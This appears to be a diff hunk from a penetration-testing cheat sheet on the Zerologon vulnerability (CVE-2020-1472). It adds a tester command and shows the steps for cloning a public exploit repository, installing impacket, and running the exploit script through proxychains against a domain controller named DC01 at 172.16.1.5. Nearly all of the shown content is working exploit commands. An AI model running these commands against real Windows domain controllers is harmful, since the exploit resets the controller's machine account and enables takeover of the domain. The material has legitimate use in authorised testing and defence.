@@ -534,13 +534,16 @@ Exploit steps from the white paper
 
 * `cve-2020-1472-exploit.py` - Python script from dirkjanm
   ```powershell
+	# Check (https://github.com/SecuraBV/CVE-2020-1472)
+	proxychains python3 zerologon_tester.py DC01 172.16.1.5
+	
   $ git clone https://github.com/dirkjanm/CVE-2020-1472.git
 
   # Activate a virtual env to install impacket
   $ python3 -m venv venv
   $ source venv/bin/activate
   $ pip3 install .
-
+	
   # Exploit the CVE (https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py)
   proxychains python3 cve-2020-1472-exploit.py DC01 172.16.1.5
 
